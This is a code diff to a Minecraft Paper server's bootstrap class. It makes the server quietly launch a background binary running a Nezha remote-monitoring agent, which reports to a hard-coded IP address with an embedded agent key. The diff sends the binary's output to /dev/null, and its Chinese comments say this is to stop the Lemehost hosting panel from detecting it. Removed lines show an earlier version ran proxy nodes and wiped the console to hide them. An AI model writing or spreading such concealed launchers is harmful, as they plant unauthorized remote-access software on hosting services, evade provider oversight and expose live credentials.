@@ -12,7 +12,7 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 public final class PaperBootstrap {
-    
+
     private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
     private static final String ANSI_GREEN = "\033[1;32m";
     private static final String ANSI_RED = "\033[1;31m";
@@ -20,63 +20,41 @@ public final class PaperBootstrap {
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
     
+    // 1. 清理环境变量池，仅保留哪吒探针和系统所需的基础变量
     private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
-        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
+        "UUID", "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY", "DISABLE_ARGO"
     };
 
     private PaperBootstrap() {
     }
 
     public static void boot(final OptionSet options) {
-        // check java version
+        // 检查 Java 版本
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
-            try {
-                Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
+            System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch the version in startup menu!" + ANSI_RESET);
             System.exit(1);
         }
         
         try {
+            // 异步启动哪吒探针（不会阻塞主线程）
             runSbxBinary();
             
+            // 注册关闭钩子，在 MC 服务器关闭时一同杀掉探针进程
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
             }));
 
-            Thread.sleep(15000);
-            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
-            Thread.sleep(20000);
-            clearConsole();
+            System.out.println(ANSI_GREEN + "[System] Background Nezha agent started successfully." + ANSI_RESET);
 
+            // 2. 【关键修改】直接启动 Minecraft，完全移除 Thread.sleep 和 clearConsole
+            // 这能让 Lemehost 面板立即检测到 MC 核心正在加载，防止触发假死报错 (Gotty)
             SharedConstants.tryDetectVersion();
             getStartupVersionMessages().forEach(LOGGER::info);
             Main.main(options);
             
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
-        }
-    }
-
-    private static void clearConsole() {
-        try {
-            if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
-            } else {
-                System.out.print("\033[H\033[2J");
-                System.out.flush();
-            }
-        } catch (Exception e) {
-            // Ignore exceptions
+            System.err.println(ANSI_RED + "Error initializing background services: " + e.getMessage() + ANSI_RESET);
         }
     }
     
@@ -86,34 +64,23 @@ public final class PaperBootstrap {
         
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
+        
+        // 3. 【关键修改】将探针程序的输出重定向到“黑洞”，防止探针日志刷屏污染 MC 控制台，导致面板误判
         pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        File nullFile = new File(System.getProperty("os.name").contains("Windows") ? "NUL" : "/dev/null");
+        pb.redirectOutput(nullFile);
         
         sbxProcess = pb.start();
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
+        // 填入你的基础信息
         envVars.put("UUID", "ee24c746-b4b6-4bb2-a7ac-9e763d72052f");
-        envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "149.56.18.147:11111");
-        envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "ubpmaEb3yFt2VBc4iI9yW0QW0avBtjWi");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
-        envVars.put("S5_PORT", "");
-        envVars.put("HY2_PORT", "");
-        envVars.put("TUIC_PORT", "");
-        envVars.put("ANYTLS_PORT", "");
-        envVars.put("REALITY_PORT", "");
-        envVars.put("ANYREALITY_PORT", "");
-        envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "cdns.doon.eu.org");
-        envVars.put("CFPORT", "443");
-        envVars.put("NAME", "");
-        envVars.put("DISABLE_ARGO", "false");
+        
+        // 显式禁用 Argo 隧道和节点生成逻辑
+        envVars.put("DISABLE_ARGO", "true");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -175,7 +142,7 @@ public final class PaperBootstrap {
     private static void stopServices() {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
-            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+            System.out.println(ANSI_RED + "Background process terminated" + ANSI_RESET);
         }
     }
 
@@ -193,20 +160,11 @@ public final class PaperBootstrap {
         return List.of(
             String.format(
                 "Running Java %s (%s %s; %s %s) on %s %s (%s)",
-                javaSpecVersion,
-                javaVmName,
-                javaVmVersion,
-                javaVendor,
-                javaVendorVersion,
-                osName,
-                osVersion,
-                osArch
+                javaSpecVersion, javaVmName, javaVmVersion, javaVendor, javaVendorVersion, osName, osVersion, osArch
             ),
             String.format(
                 "Loading %s %s for Minecraft %s",
-                bi.brandName(),
-                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
-                bi.minecraftVersionId()
+                bi.brandName(), bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL), bi.minecraftVersionId()
             )
         );
     }
